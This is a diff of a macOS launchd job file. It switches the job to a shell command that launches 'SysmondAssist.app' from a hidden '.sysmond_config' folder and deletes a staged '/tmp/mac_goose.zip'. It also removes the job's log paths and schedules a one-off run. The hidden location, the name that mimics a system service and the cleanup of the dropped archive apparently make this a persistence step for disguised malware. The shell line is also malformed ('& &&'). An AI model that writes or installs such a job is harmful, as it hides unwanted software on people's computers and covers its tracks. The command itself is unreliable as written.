@@ -5,24 +5,26 @@
     <key>Label</key>
     <string>com.user.assetjob</string>
 
-    <key>StartCalendarInterval</key>
-    <dict>
-      <key>Hour</key>
-      <integer>11</integer>
-      <key>Minute</key>
-      <integer>50</integer>
-    </dict>
-
     <key>ProgramArguments</key>
     <array>
-      <string>/usr/bin/open</string>
-      <string>${HOME}/.sysmond_config/SysmondAssist.app</string>
+      <string>/bin/sh</string>
+      <string>-c</string>
+      <string> nohup open -a /Users/home/.sysmond_config/SysmondAssist.app & && rm /tmp/mac_goose.zip</string>
     </array>
 
-    <key>StandardOutPath</key>
-    <string>/tmp/com.user.assetjob.out</string>
+    <key>StartCalendarInterval</key>
+    <dict>
+      <key>Month</key>
+      <integer>08</integer>
 
-    <key>StandardErrorPath</key>
-    <string>/tmp/com.user.assetjob.err</string>
+      <key>Day</key>
+      <integer>04</integer>
+
+      <key>Hour</key>
+      <integer>12</integer>
+
+      <key>Minute</key>
+      <integer>05</integer>
+    </dict>
   </dict>
 </plist>
